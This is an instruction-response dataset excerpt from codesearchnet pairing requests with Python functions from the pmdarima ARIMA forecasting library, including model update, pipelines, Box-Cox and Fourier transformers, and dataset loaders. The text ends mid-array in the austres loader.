{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 script to\nupdate the model with additional observed endog and exog values.", "response": "def update(self, y, exogenous=None, maxiter=None, **kwargs):\n        \"\"\"Update the model fit with additional observed endog/exog values.\n\n        Updating an ARIMA adds new observations to the model, updating the\n        MLE of the parameters accordingly by performing several new iterations\n        (``maxiter``) from the existing model parameters.\n\n        Parameters\n        ----------\n        y : array-like or iterable, shape=(n_samples,)\n            The time-series data to add to the endogenous samples on which the\n            ``ARIMA`` estimator was previously fit. This may either be a Pandas\n            ``Series`` object or a numpy array. This should be a one-\n            dimensional array of finite floats.\n\n        exogenous : array-like, shape=[n_obs, n_vars], optional (default=None)\n            An optional 2-d array of exogenous variables. If the model was\n            fit with an exogenous array of covariates, it will be required for\n            updating the observed values.\n\n        maxiter : int, optional (default=None)\n            The number of iterations to perform when updating the model. If\n            None, will perform ``max(5, n_samples // 10)`` iterations.\n\n        **kwargs : keyword args\n            Any keyword args that should be passed as ``**fit_kwargs`` in the\n            new model fit.\n\n        Notes\n        -----\n        * Internally, this calls ``fit`` again using the OLD model parameters\n          as the starting parameters for the new model's MLE computation.\n        \"\"\"\n        check_is_fitted(self, 'arima_res_')\n        model_res = self.arima_res_\n\n        # validate the new samples to add\n        y = c1d(check_array(y, ensure_2d=False, force_all_finite=False,\n                            copy=True, dtype=DTYPE))  # type: np.ndarray\n        n_samples = y.shape[0]\n\n        # if exogenous is None and new exog provided, or vice versa, raise\n        exogenous = self._check_exog(exogenous)  # type: np.ndarray\n\n        # ensure the k_exog matches\n        if exogenous is not None:\n            k_exog = model_res.model.k_exog\n            n_exog, exog_dim = exogenous.shape\n\n            if exogenous.shape[1] != k_exog:\n                raise ValueError(\"Dim mismatch in fit exogenous (%i) and new \"\n                                 \"exogenous (%i)\" % (k_exog, exog_dim))\n\n            # make sure the number of samples in exogenous match the number\n            # of samples in the endog\n            if n_exog != n_samples:\n                raise ValueError(\"Dim mismatch in n_samples \"\n                                 \"(endog=%i, exog=%i)\"\n                                 % (n_samples, n_exog))\n\n        # first concatenate the original data (might be 2d or 1d)\n        y = np.squeeze(_append_to_endog(model_res.data.endog, y))\n\n        # Now create the new exogenous.\n        if exogenous is not None:\n            # Concatenate\n            exog = np.concatenate((model_res.data.exog, exogenous), axis=0)\n        else:\n            # Just so it's in the namespace\n            exog = None\n\n        # This is currently arbitrary... but it's here to avoid accidentally\n        # overfitting a user's model. Would be nice to find some papers that\n        # describe the best way to set this.\n        if maxiter is None:\n            maxiter = max(5, n_samples // 10)\n\n        # Get the model parameters, then we have to \"fit\" a new one. If you're\n        # reading this source code, don't panic! We're not just fitting a new\n        # arbitrary model. Statsmodels does not handle patching new samples in\n        # very well, so we seed the new model with the existing parameters.\n        params = model_res.params\n        self._fit(y, exog, start_params=params, maxiter=maxiter, **kwargs)\n\n        # Behaves like `fit`\n        return self"}
{"SOURCE": "codesearchnet", "instruction": "Can you implement a function in Python 3 that\nreturns the dictionary representation of the ARIMA model as a dictionary.", "response": "def to_dict(self):\n        \"\"\"Get the ARIMA model as a dictionary\n\n        Return the dictionary representation of the ARIMA model\n\n        Returns\n        -------\n        res : dictionary\n            The ARIMA model as a dictionary.\n        \"\"\"\n        return {\n            'pvalues': self.pvalues(),\n            'resid': self.resid(),\n            'order': self.order,\n            'seasonal_order': self.seasonal_order,\n            'oob': self.oob(),\n            'aic': self.aic(),\n            'aicc': self.aicc(),\n            'bic': self.bic(),\n            'bse': self.bse(),\n            'params': self.params()\n        }"}
{"SOURCE": "codesearchnet", "instruction": "How would you code a function in Python 3 to\nplot an ARIMA s diagnostics for standardized residuals of one endogenous variable.", "response": "def plot_diagnostics(self, variable=0, lags=10, fig=None, figsize=None):\n        \"\"\"Plot an ARIMA's diagnostics.\n\n        Diagnostic plots for standardized residuals of one endogenous variable\n\n        Parameters\n        ----------\n        variable : integer, optional\n            Index of the endogenous variable for which the diagnostic plots\n            should be created. Default is 0.\n\n        lags : integer, optional\n            Number of lags to include in the correlogram. Default is 10.\n\n        fig : Matplotlib Figure instance, optional\n            If given, subplots are created in this figure instead of in a new\n            figure. Note that the 2x2 grid will be created in the provided\n            figure using `fig.add_subplot()`.\n\n        figsize : tuple, optional\n            If a figure is created, this argument allows specifying a size.\n            The tuple is (width, height).\n\n        Notes\n        -----\n        Produces a 2x2 plot grid with the following plots (ordered clockwise\n        from top left):\n\n        1. Standardized residuals over time\n        2. Histogram plus estimated density of standardized residulas, along\n           with a Normal(0,1) density plotted for reference.\n        3. Normal Q-Q plot, with Normal reference line.\n        4. Correlogram\n\n        See Also\n        --------\n        statsmodels.graphics.gofplots.qqplot\n        pmdarima.utils.visualization.plot_acf\n\n        References\n        ----------\n        .. [1] https://www.statsmodels.org/dev/_modules/statsmodels/tsa/statespace/mlemodel.html#MLEResults.plot_diagnostics  # noqa: E501\n        \"\"\"\n        # implicitly checks whether installed, and does our backend magic:\n        _get_plt()\n\n        # We originally delegated down to SARIMAX model wrapper, but\n        # statsmodels makes it difficult to trust their API, so we just re-\n        # implemented a common method for all results wrappers.\n        from statsmodels.graphics.utils import create_mpl_fig\n        fig = create_mpl_fig(fig, figsize)\n\n        res_wpr = self.arima_res_\n        data = res_wpr.data\n\n        # Eliminate residuals associated with burned or diffuse likelihoods.\n        # The statsmodels code for the Kalman Filter takes the loglik_burn\n        # as a parameter:\n\n        # loglikelihood_burn : int, optional\n        #     The number of initial periods during which the loglikelihood is\n        #     not recorded. Default is 0.\n\n        # If the class has it, it's a SARIMAX and we'll use it. Otherwise we\n        # will just access the residuals as we normally would...\n        if hasattr(res_wpr, 'loglikelihood_burn'):\n            # This is introduced in the bleeding edge version, but is not\n            # backwards compatible with 0.9.0 and less:\n            d = res_wpr.loglikelihood_burn\n            if hasattr(res_wpr, 'nobs_diffuse'):\n                d = np.maximum(d, res_wpr.nobs_diffuse)\n\n            resid = res_wpr.filter_results\\\n                           .standardized_forecasts_error[variable, d:]\n        else:\n            # This gets the residuals, but they need to be standardized\n            d = 0\n            r = res_wpr.resid\n            resid = (r - np.nanmean(r)) / np.nanstd(r)\n\n        # Top-left: residuals vs time\n        ax = fig.add_subplot(221)\n        if hasattr(data, 'dates') and data.dates is not None:\n            x = data.dates[d:]._mpl_repr()\n        else:\n            x = np.arange(len(resid))\n        ax.plot(x, resid)\n        ax.hlines(0, x[0], x[-1], alpha=0.5)\n        ax.set_xlim(x[0], x[-1])\n        ax.set_title('Standardized residual')\n\n        # Top-right: histogram, Gaussian kernel density, Normal density\n        # Can only do histogram and Gaussian kernel density on the non-null\n        # elements\n        resid_nonmissing = resid[~(np.isnan(resid))]\n        ax = fig.add_subplot(222)\n        # temporarily disable Deprecation warning, normed -> density\n        # hist needs to use `density` in future when minimum matplotlib has it\n        with warnings.catch_warnings(record=True):\n            ax.hist(resid_nonmissing, normed=True, label='Hist')\n\n        kde = gaussian_kde(resid_nonmissing)\n        xlim = (-1.96 * 2, 1.96 * 2)\n        x = np.linspace(xlim[0], xlim[1])\n        ax.plot(x, kde(x), label='KDE')\n        ax.plot(x, norm.pdf(x), label='N(0,1)')\n        ax.set_xlim(xlim)\n        ax.legend()\n        ax.set_title('Histogram plus estimated density')\n\n        # Bottom-left: QQ plot\n        ax = fig.add_subplot(223)\n        from statsmodels.graphics.gofplots import qqplot\n        qqplot(resid_nonmissing, line='s', ax=ax)\n        ax.set_title('Normal Q-Q')\n\n        # Bottom-right: Correlogram\n        ax = fig.add_subplot(224)\n        from statsmodels.graphics.tsaplots import plot_acf\n        plot_acf(resid, ax=ax, lags=lags)\n        ax.set_title('Correlogram')\n\n        ax.set_ylim(-1, 1)\n\n        return fig"}
{"SOURCE": "codesearchnet", "instruction": "Explain what the following Python 3 code does\ndef fit(self, y, exogenous=None):\n        lam1 = self.lmbda\n        lam2 = self.lmbda2\n\n        if lam2 < 0:\n            raise ValueError(\"lmbda2 must be a non-negative scalar value\")\n\n        if lam1 is None:\n            y, _ = self._check_y_exog(y, exogenous)\n            _, lam1 = stats.boxcox(y, lmbda=None, alpha=None)\n\n        self.lam1_ = lam1\n        self.lam2_ = lam2\n        return self", "response": "Fit the transformer to the endogenous and non - exogenous endogenous times."}
{"SOURCE": "codesearchnet", "instruction": "Here you have a function in Python 3, explain what it does\ndef transform(self, y, exogenous=None, **_):\n        check_is_fitted(self, \"lam1_\")\n        lam1 = self.lam1_\n        lam2 = self.lam2_\n\n        y, exog = self._check_y_exog(y, exogenous)\n        y += lam2\n\n        neg_mask = y <= 0.\n        if neg_mask.any():\n            action = self.neg_action\n            msg = \"Negative or zero values present in y\"\n            if action == \"raise\":\n                raise ValueError(msg)\n            elif action == \"warn\":\n                warnings.warn(msg, UserWarning)\n            y[neg_mask] = self.floor\n\n        if lam1 == 0:\n            return np.log(y), exog\n        return (y ** lam1 - 1) / lam1, exog", "response": "Apply the Box - Cox transformation to the new array."}
{"SOURCE": "codesearchnet", "instruction": "How would you explain what the following Python 3 function does\ndef inverse_transform(self, y, exogenous=None):\n        check_is_fitted(self, \"lam1_\")\n        lam1 = self.lam1_\n        lam2 = self.lam2_\n\n        y, exog = self._check_y_exog(y, exogenous)\n        if lam1 == 0:\n            return np.exp(y) - lam2, exog\n\n        numer = y * lam1  # remove denominator\n        numer += 1.  # add 1 back to it\n        de_exp = numer ** (1. / lam1)  # de-exponentiate\n        return de_exp - lam2, exog", "response": "Inverse transform a transformed array by the Box - Cox transformation on the transformed array."}
{"SOURCE": "codesearchnet", "instruction": "Explain what the following Python 3 code does\ndef _regularize(x, y, ties):\n    x, y = [\n        column_or_1d(check_array(arr, ensure_2d=False,\n                                 force_all_finite=False,\n                                 dtype=DTYPE))\n        for arr in (x, y)\n    ]\n\n    nx = x.shape[0]\n    if nx != y.shape[0]:\n        raise ValueError('array dim mismatch: %i != %i' % (nx, y.shape[0]))\n\n    # manipulate x if needed. if ties is 'ordered' we assume that x is\n    # already ordered and everything has been handled already...\n    if ties != 'ordered':\n        o = np.argsort(x)\n\n        # keep ordered with one another\n        x = x[o]\n        y = y[o]\n\n        # what if any are the same?\n        ux = np.unique(x)\n        if ux.shape[0] < nx:\n            # Do we want to warn for this?\n            # warnings.warn('collapsing to unique \"x\" values')\n\n            # vectorize this function to apply to each \"cell\" in the array\n            def tie_apply(f, u_val):\n                vals = y[x == u_val]  # mask y where x == the unique value\n                return f(vals)\n\n            # replace the duplicates in the y array with the \"tie\" func\n            func = VALID_TIES.get(ties, _identity)\n\n            # maybe expensive to vectorize on the fly? Not sure; would need\n            # to do some benchmarking. However, we need to in order to keep y\n            # and x in scope...\n            y = np.vectorize(tie_apply)(func, ux)\n\n            # does ux need ordering? hmm..\n            x = ux\n\n    return x, y", "response": "Regularize the values x and y and return a new array of the n_samples elements."}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 function for\ngetting the callable mapped by a key from a dictionary.", "response": "def get_callable(key, dct):\n    \"\"\"Get the callable mapped by a key from a dictionary. This is\n    necessary for pickling (so we don't try to pickle an unbound method).\n\n    Parameters\n    ----------\n    key : str\n        The key for the ``dct`` dictionary.\n\n    dct : dict\n        The dictionary of callables.\n    \"\"\"\n    from sklearn.externals import six\n    fun = dct.get(key, None)\n\n    if not isinstance(key, six.string_types) or \\\n            fun is None:  # ah, that's no fun :(\n        raise ValueError('key must be a string in one in %r, but got %r'\n                         % (dct, key))\n    return fun"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 function that can\nvalidate input y and exog.", "response": "def _check_y_exog(y, exog):\n        \"\"\"Validate input\"\"\"\n        # Do not force finite, since a transformer's goal may be imputation.\n        if y is not None:\n            y = column_or_1d(\n                check_array(y, ensure_2d=False, dtype=DTYPE, copy=True,\n                            force_all_finite=False))\n        if exog is not None:\n            exog = check_array(exog, ensure_2d=True, dtype=DTYPE,\n                               copy=True, force_all_finite=False)\n        return y, exog"}
{"SOURCE": "codesearchnet", "instruction": "Make a summary of the following Python 3 code\ndef fit_transform(self, y, exogenous=None, **transform_kwargs):\n        self.fit(y, exogenous)\n        return self.transform(y, exogenous, **transform_kwargs)", "response": "Fit and transform the arrays\n           "}
{"SOURCE": "codesearchnet", "instruction": "Can you tell what is the following Python 3 function doing\ndef _iter(self, with_final=True):\n        # MUST have called fit first\n        stop = len(self.steps_)\n        if not with_final:\n            stop -= 1\n\n        for idx, (name, trans) in enumerate(islice(self.steps_, 0, stop)):\n            yield idx, name, trans", "response": "Generate the tuples of the current set of entries."}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 script to\nfit the pipeline of transformers and the ARIMA model to a series of time - series and exogenous arrays.", "response": "def fit(self, y, exogenous=None, **fit_kwargs):\n        \"\"\"Fit the pipeline of transformers and the ARIMA model\n\n        Chain the time-series and exogenous arrays through a series of\n        transformations, fitting each stage along the way, finally fitting an\n        ARIMA or AutoARIMA model.\n\n        Parameters\n        ----------\n        y : array-like or iterable, shape=(n_samples,)\n            The time-series to which to fit the ``ARIMA`` estimator. This may\n            either be a Pandas ``Series`` object (statsmodels can internally\n            use the dates in the index), or a numpy array. This should be a\n            one-dimensional array of floats, and should not contain any\n            ``np.nan`` or ``np.inf`` values.\n\n        exogenous : array-like, shape=[n_obs, n_vars], optional (default=None)\n            An optional 2-d array of exogenous variables. If provided, these\n            variables are used as additional features in the regression\n            operation. This should not include a constant or trend. Note that\n            if an ``ARIMA`` is fit on exogenous features, it must be provided\n            exogenous features for making predictions.\n\n        **fit_kwargs : keyword args\n            Extra keyword arguments used for each stage's ``fit`` stage.\n            Similar to scikit-learn pipeline keyword args, the keys are\n            compound, comprised of the stage name and the argument name\n            separated by a \"__\". For instance, if fitting an ARIMA in stage\n            \"arima\", your kwargs may resemble::\n\n                {\"arima__maxiter\": 10}\n        \"\"\"\n        # Shallow copy\n        steps = self.steps_ = self._validate_steps()\n\n        yt = y\n        Xt = exogenous\n        named_kwargs = self._get_kwargs(**fit_kwargs)\n\n        for step_idx, name, transformer in self._iter(with_final=False):\n            cloned_transformer = clone(transformer)\n            kwargs = named_kwargs[name]\n            yt, Xt = cloned_transformer.fit_transform(yt, Xt, **kwargs)\n\n            # Replace the transformer of the step with the fitted\n            # transformer.\n            steps[step_idx] = (name, cloned_transformer)\n\n        # Now fit the final estimator\n        kwargs = named_kwargs[steps[-1][0]]\n        self._final_estimator.fit(yt, exogenous=Xt, **kwargs)\n        return self"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 script to\ngenerate predictions for the given number of periods in the future.", "response": "def predict(self, n_periods=10, exogenous=None,\n                return_conf_int=False, alpha=0.05, **kwargs):\n        \"\"\"Forecast future (transformed) values\n\n        Generate predictions (forecasts) ``n_periods`` in the future.\n        Note that if ``exogenous`` variables were used in the model fit, they\n        will be expected for the predict procedure and will fail otherwise.\n        Forecasts may be transformed by the endogenous steps along the way and\n        might be on a different scale than raw training/test data.\n\n        Parameters\n        ----------\n        n_periods : int, optional (default=10)\n            The number of periods in the future to forecast.\n\n        exogenous : array-like, shape=[n_obs, n_vars], optional (default=None)\n            An optional 2-d array of exogenous variables. If provided, these\n            variables are used as additional features in the regression\n            operation. This should not include a constant or trend. Note that\n            if an ``ARIMA`` is fit on exogenous features, it must be provided\n            exogenous features for making predictions.\n\n        return_conf_int : bool, optional (default=False)\n            Whether to get the confidence intervals of the forecasts.\n\n        alpha : float, optional (default=0.05)\n            The confidence intervals for the forecasts are (1 - alpha) %\n\n        **kwargs : keyword args\n            Extra keyword arguments used for each stage's ``transform`` stage\n            and the estimator's ``predict`` stage. Similar to scikit-learn\n            pipeline keyword args, the keys are compound, comprised of the\n            stage name and the argument name separated by a \"__\". For instance,\n            if you have a FourierFeaturizer whose stage is named\n            \"fourier\", your transform kwargs could resemble::\n\n                {\"fourier__n_periods\": 50}\n\n        Returns\n        -------\n        forecasts : array-like, shape=(n_periods,)\n            The array of transformed, forecasted values.\n\n        conf_int : array-like, shape=(n_periods, 2), optional\n            The confidence intervals for the forecasts. Only returned if\n            ``return_conf_int`` is True.\n        \"\"\"\n        check_is_fitted(self, \"steps_\")\n\n        # Push the arrays through the transformer stages, but ONLY the exog\n        # transformer stages since we don't have a Y...\n        Xt = exogenous\n        named_kwargs = self._get_kwargs(**kwargs)\n\n        for step_idx, name, transformer in self._iter(with_final=False):\n            if isinstance(transformer, BaseExogTransformer):\n                kw = named_kwargs[name]\n\n                # If it's a featurizer, we may also need to add 'n_periods'\n                if isinstance(transformer, BaseExogFeaturizer):\n                    num_p = kw.get(\"n_periods\", None)\n                    if num_p is not None and num_p != n_periods:\n                        raise ValueError(\"Manually set 'n_periods' kwarg for \"\n                                         \"step '%s' differs from forecasting \"\n                                         \"n_periods (%r != %r)\"\n                                         % (name, num_p, n_periods))\n                    kw[\"n_periods\"] = n_periods\n\n                _, Xt = transformer.transform(y=None, exogenous=Xt, **kw)\n\n        # Now we should be able to run the prediction\n        nm, est = self.steps_[-1]\n        return est.predict(\n            n_periods=n_periods, exogenous=Xt,\n            return_conf_int=return_conf_int,\n            alpha=alpha, **named_kwargs[nm])"}
{"SOURCE": "codesearchnet", "instruction": "Can you create a Python 3 function that\nupdates an ARIMA or auto - ARIMA model with the newly observed values y and exogenous values.", "response": "def update(self, y, exogenous=None, maxiter=None, **kwargs):\n        \"\"\"Update an ARIMA or auto-ARIMA as well as any necessary transformers\n\n        Passes the newly observed values through the appropriate endog\n        transformations, and the exogenous array through the exog transformers\n        (updating where necessary) before finally updating the ARIMA model.\n\n        Parameters\n        ----------\n        y : array-like or iterable, shape=(n_samples,)\n            The time-series data to add to the endogenous samples on which the\n            ``ARIMA`` estimator was previously fit. This may either be a Pandas\n            ``Series`` object or a numpy array. This should be a one-\n            dimensional array of finite floats.\n\n        exogenous : array-like, shape=[n_obs, n_vars], optional (default=None)\n            An optional 2-d array of exogenous variables. If the model was\n            fit with an exogenous array of covariates, it will be required for\n            updating the observed values.\n\n        maxiter : int, optional (default=None)\n            The number of iterations to perform when updating the model. If\n            None, will perform ``max(5, n_samples // 10)`` iterations.\n\n        **kwargs : keyword args\n            Extra keyword arguments used for each stage's ``update`` stage.\n            Similar to scikit-learn pipeline keyword args, the keys are\n            compound, comprised of the stage name and the argument name\n            separated by a \"__\".\n        \"\"\"\n        check_is_fitted(self, \"steps_\")\n\n        # Push the arrays through all of the transformer steps that have the\n        # appropriate update_and_transform method\n        yt = y\n        Xt = exogenous\n        named_kwargs = self._get_kwargs(**kwargs)\n\n        for step_idx, name, transformer in self._iter(with_final=False):\n            kw = named_kwargs[name]\n            if hasattr(transformer, \"update_and_transform\"):\n                yt, Xt = transformer.update_and_transform(\n                    y=yt, exogenous=Xt, **kw)\n            else:\n                yt, Xt = transformer.transform(yt, exogenous=Xt, **kw)\n\n        # Now we can update the arima\n        nm, est = self.steps_[-1]\n        return est.update(\n            yt, exogenous=Xt, maxiter=maxiter, **named_kwargs[nm])"}
{"SOURCE": "codesearchnet", "instruction": "Create a Python 3 function to\ncheck the endog and exog arrays and return the endog and exog arrays.", "response": "def _check_y_exog(self, y, exog, null_allowed=False):\n        \"\"\"Check the endog and exog arrays\"\"\"\n        y, exog = super(BaseExogTransformer, self)._check_y_exog(y, exog)\n        if exog is None and not null_allowed:\n            raise ValueError(\"exog must be non-None for exogenous \"\n                             \"transformers\")\n        return y, exog"}
{"SOURCE": "codesearchnet", "instruction": "How would you code a function in Python 3 to\nload the wine - makers from the time - series dataset.", "response": "def load_wineind(as_series=False):\n    \"\"\"Australian total wine sales by wine makers in bottles <= 1 litre.\n\n    This time-series records wine sales by Australian wine makers between\n    Jan 1980 -- Aug 1994. This dataset is found in the R ``forecast`` package.\n\n    Parameters\n    ----------\n    as_series : bool, optional (default=False)\n        Whether to return a Pandas series. If True, the index will be set to\n        the observed years/months. If False, will return a 1d numpy array.\n\n    Notes\n    -----\n    This is monthly data, so *m* should be set to 12 when using in a seasonal\n    context.\n\n    Examples\n    --------\n    >>> from pmdarima.datasets import load_wineind\n    >>> load_wineind()\n    array([15136, 16733, 20016, 17708, 18019, 19227, 22893, 23739, 21133,\n           22591, 26786, 29740, 15028, 17977, 20008, 21354, 19498, 22125,\n           25817, 28779, 20960, 22254, 27392, 29945, 16933, 17892, 20533,\n           23569, 22417, 22084, 26580, 27454, 24081, 23451, 28991, 31386,\n           16896, 20045, 23471, 21747, 25621, 23859, 25500, 30998, 24475,\n           23145, 29701, 34365, 17556, 22077, 25702, 22214, 26886, 23191,\n           27831, 35406, 23195, 25110, 30009, 36242, 18450, 21845, 26488,\n           22394, 28057, 25451, 24872, 33424, 24052, 28449, 33533, 37351,\n           19969, 21701, 26249, 24493, 24603, 26485, 30723, 34569, 26689,\n           26157, 32064, 38870, 21337, 19419, 23166, 28286, 24570, 24001,\n           33151, 24878, 26804, 28967, 33311, 40226, 20504, 23060, 23562,\n           27562, 23940, 24584, 34303, 25517, 23494, 29095, 32903, 34379,\n           16991, 21109, 23740, 25552, 21752, 20294, 29009, 25500, 24166,\n           26960, 31222, 38641, 14672, 17543, 25453, 32683, 22449, 22316,\n           27595, 25451, 25421, 25288, 32568, 35110, 16052, 22146, 21198,\n           19543, 22084, 23816, 29961, 26773, 26635, 26972, 30207, 38687,\n           16974, 21697, 24179, 23757, 25013, 24019, 30345, 24488, 25156,\n           25650, 30923, 37240, 17466, 19463, 24352, 26805, 25236, 24735,\n           29356, 31234, 22724, 28496, 32857, 37198, 13652, 22784, 23565,\n           26323, 23779, 27549, 29660, 23356])\n\n    >>> load_wineind(True).head()\n    Jan 1980    15136\n    Feb 1980    16733\n    Mar 1980    20016\n    Apr 1980    17708\n    May 1980    18019\n    dtype: int64\n\n    References\n    ----------\n    .. [1] https://www.rdocumentation.org/packages/forecast/versions/8.1/topics/wineind  # noqa: E501\n\n    Returns\n    -------\n    rslt : array-like, shape=(n_samples,)\n        The wineind dataset. There are 176 observations.\n    \"\"\"\n    rslt = np.array([15136, 16733, 20016, 17708, 18019, 19227, 22893, 23739,\n                     21133, 22591, 26786, 29740, 15028, 17977, 20008, 21354,\n                     19498, 22125, 25817, 28779, 20960, 22254, 27392, 29945,\n                     16933, 17892, 20533, 23569, 22417, 22084, 26580, 27454,\n                     24081, 23451, 28991, 31386, 16896, 20045, 23471, 21747,\n                     25621, 23859, 25500, 30998, 24475, 23145, 29701, 34365,\n                     17556, 22077, 25702, 22214, 26886, 23191, 27831, 35406,\n                     23195, 25110, 30009, 36242, 18450, 21845, 26488, 22394,\n                     28057, 25451, 24872, 33424, 24052, 28449, 33533, 37351,\n                     19969, 21701, 26249, 24493, 24603, 26485, 30723, 34569,\n                     26689, 26157, 32064, 38870, 21337, 19419, 23166, 28286,\n                     24570, 24001, 33151, 24878, 26804, 28967, 33311, 40226,\n                     20504, 23060, 23562, 27562, 23940, 24584, 34303, 25517,\n                     23494, 29095, 32903, 34379, 16991, 21109, 23740, 25552,\n                     21752, 20294, 29009, 25500, 24166, 26960, 31222, 38641,\n                     14672, 17543, 25453, 32683, 22449, 22316, 27595, 25451,\n                     25421, 25288, 32568, 35110, 16052, 22146, 21198, 19543,\n                     22084, 23816, 29961, 26773, 26635, 26972, 30207, 38687,\n                     16974, 21697, 24179, 23757, 25013, 24019, 30345, 24488,\n                     25156, 25650, 30923, 37240, 17466, 19463, 24352, 26805,\n                     25236, 24735, 29356, 31234, 22724, 28496, 32857, 37198,\n                     13652, 22784, 23565, 26323, 23779, 27549, 29660, 23356])\n\n    if not as_series:\n        return rslt\n\n    # Otherwise we want a series and have to cleverly create the index\n    # (we don't want after aug in 1994, so trip Sep, Oct, Nov and Dec)\n    index = [\n        \"%s %i\" % (calendar.month_abbr[i + 1], year)\n        for year in range(1980, 1995)\n        for i in range(12)\n    ][:-4]\n\n    return pd.Series(rslt, index=index)"}
{"SOURCE": "codesearchnet", "instruction": "Implement a Python 3 function for\nfitting the transformer to the endogenous and exogenous Fourier terms.", "response": "def fit(self, y, exogenous=None):\n        \"\"\"Fit the transformer\n\n        Computes the periods of all the Fourier terms. The values of ``y`` are\n        not actually used; only the periodicity is used when computing Fourier\n        terms.\n\n        Parameters\n        ----------\n        y : array-like or None, shape=(n_samples,)\n            The endogenous (time-series) array.\n\n        exogenous : array-like or None, shape=(n_samples, n_features), optional\n            The exogenous array of additional covariates. If specified, the\n            Fourier terms will be column-bound on the right side of the matrix.\n            Otherwise, the Fourier terms will be returned as the new exogenous\n            array.\n        \"\"\"\n        # Since we don't fit any params here, we can just check the params\n        _, _ = self._check_y_exog(y, exogenous, null_allowed=True)\n\n        m = self.m\n        k = self.k\n        if k is None:\n            k = m // 2\n        if 2 * k > m or k < 1:\n            raise ValueError(\"k must be a positive integer not greater \"\n                             \"than m//2\")\n\n        # Compute the periods of all Fourier terms. Since R allows multiple\n        # seasonality and we do not, we can do this much more simply.\n        p = ((np.arange(k) + 1) / m).astype(np.float64)  # 1:K / m\n\n        # If sinpi is 0... maybe blow up?\n        # if abs(2 * p - round(2 * p)) < np.finfo(y.dtype).eps:  # min eps\n\n        self.p_ = p\n        self.k_ = k\n        self.n_ = y.shape[0]\n\n        return self"}
{"SOURCE": "codesearchnet", "instruction": "Explain what the following Python 3 code does\ndef transform(self, y, exogenous=None, n_periods=0, **_):\n        check_is_fitted(self, \"p_\")\n        _, exog = self._check_y_exog(y, exogenous, null_allowed=True)\n\n        if n_periods and exog is not None:\n            if n_periods != exog.shape[0]:\n                raise ValueError(\"If n_periods and exog are specified, \"\n                                 \"n_periods must match dims of exogenous\")\n\n        times = np.arange(self.n_ + n_periods, dtype=np.float64) + 1\n        X_fourier = _fourier_terms(self.p_, times)\n\n        # Maybe trim if we're in predict mode... in that case, we only keep the\n        # last n_periods rows in the matrix we've created\n        if n_periods:\n            X_fourier = X_fourier[-n_periods:, :]\n\n        if exog is None:\n            exog = X_fourier\n        else:\n            exog = np.hstack([exog, X_fourier])\n\n        return y, exog", "response": "This method transforms the ARIMA data into Fourier terms."}
{"SOURCE": "codesearchnet", "instruction": "Can you generate a brief explanation for the following Python 3 code\ndef update_and_transform(self, y, exogenous, **kwargs):\n        check_is_fitted(self, \"p_\")\n\n        self._check_endog(y)\n        _, Xt = self.transform(y, exogenous, n_periods=len(y), **kwargs)\n\n        # Update this *after* getting the exog features\n        self.n_ += len(y)\n        return y, Xt", "response": "Update the params and return the transformed arrays"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate the documentation for the following Python 3 function\ndef fit_predict(self, y, exogenous=None, n_periods=10, **fit_args):\n        self.fit(y, exogenous, **fit_args)\n        return self.predict(n_periods=n_periods, exogenous=exogenous)", "response": "Fit an ARIMA to a vector y and then generate a predicted version of the ARIMA."}
{"SOURCE": "codesearchnet", "instruction": "Can you generate a brief explanation for the following Python 3 code\ndef inheritdoc(parent):\n    def wrapper(func):\n        # Assign the parent docstring to the child\n        func.__doc__ = parent.__doc__\n\n        @wraps(func)\n        def caller(*args, **kwargs):\n            return func(*args, **kwargs)\n        return caller\n    return wrapper", "response": "Inherit documentation from a parent."}
{"SOURCE": "codesearchnet", "instruction": "Can you tell what is the following Python 3 function doing\ndef _check_y_exog(self, y, exog):\n        y, exog = super(BaseEndogTransformer, self)._check_y_exog(y, exog)\n        if y is None:\n            raise ValueError(\"y must be non-None for endogenous transformers\")\n        return y, exog", "response": "Check the endog and exog arrays for endogenous transformers"}
{"SOURCE": "codesearchnet", "instruction": "How would you implement a function in Python 3 that\nloads the austres dataset.", "response": "def load_austres(as_series=False):\n    \"\"\"Quarterly residential data.\n\n    Numbers (in thousands) of Australian residents measured quarterly from\n    March 1971 to March 1994.\n\n    Parameters\n    ----------\n    as_series : bool, optional (default=False)\n        Whether to return a Pandas series. If False, will return a 1d\n        numpy array.\n\n    Returns\n    -------\n    rslt : array-like, shape=(n_samples,)\n        The austres vector.\n\n    Examples\n    --------\n    >>> from pmdarima.datasets import load_austres\n    >>> load_austres()\n    np.array([13067.3, 13130.5, 13198.4, 13254.2, 13303.7, 13353.9,\n              13409.3, 13459.2, 13504.5, 13552.6, 13614.3, 13669.5,\n              13722.6, 13772.1, 13832.0, 13862.6, 13893.0, 13926.8,\n              13968.9, 14004.7, 14033.1, 14066.0, 14110.1, 14155.6,\n              14192.2, 14231.7, 14281.5, 14330.3, 14359.3, 14396.6,\n              14430.8, 14478.4, 14515.7, 14554.9, 14602.5, 14646.4,\n              14695.4, 14746.6, 14807.4, 14874.4, 14923.3, 14988.7,\n              15054.1, 15121.7, 15184.2, 15239.3, 15288.9, 15346.2,\n              15393.5, 15439.0, 15483.5, 15531.5, 15579.4, 15628.5,\n              15677.3, 15736.7, 15788.3, 15839.7, 15900.6, 15961.5,\n              16018.3, 16076.9, 16139.0, 16203.0, 16263.3, 16327.9,\n              16398.9, 16478.3, 16538.2, 16621.6, 16697.0, 16777.2,\n              16833.1, 16891.6, 16956.8, 17026.3, 17085.4, 17106.9,\n              17169.4, 17239.4, 17292.0, 17354.2, 17414.2, 17447.3,\n              17482.6, 17526.0, 17568.7, 17627.1, 17661.5])\n\n    >>> load_austres(True).head()\n    0    13067.3\n    1    13130.5\n    2    13198.4\n    3    13254.2\n    4    13303.7\n    dtype: float64\n\n    Notes\n    -----\n    This is quarterly data, so *m* should be set to 4 when using in a seasonal\n    context.\n\n    References\n    ----------\n    .. [1] P. J. Brockwell and R. A. Davis (1996)\n           \"Introduction to Time Series and Forecasting.\" Springer\n    \"\"\"\n    rslt = np.array([13067.3, 13130.5, 13198.4, 13254.2, 13303.7, 13353.9,\n                     13409.3, 13459.2, 13504.5, 13552.6, 13614.3, 13669.5,\n                     13722.6, 13772.1, 13832.0, 13862.6, 13893.0, 13926.8,\n                     13968.9, 14004.7, 14033.1, 14066.0, 14110.1, 14155.6,\n                     14192.2, 14231.7, 14281.5, 14330.3, 14359.3, 14396.6,\n                     14430.8, 